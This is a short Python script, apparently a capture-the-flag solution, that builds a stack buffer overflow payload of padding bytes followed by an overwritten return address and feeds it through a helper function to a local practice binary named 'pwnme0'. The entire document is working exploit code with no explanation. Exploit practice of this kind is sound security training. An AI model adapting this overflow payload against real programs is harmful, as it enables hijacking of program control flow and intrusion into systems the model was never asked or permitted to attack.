from templates import buff_overflow


def main():
    payload = (b"a" * (0x50 + 12)) + b"\x20\x04\x37\x13"
    fail_str = "pwnme0"

    buff_overflow(payload, fail_str, elf="./pwnme0")


main()
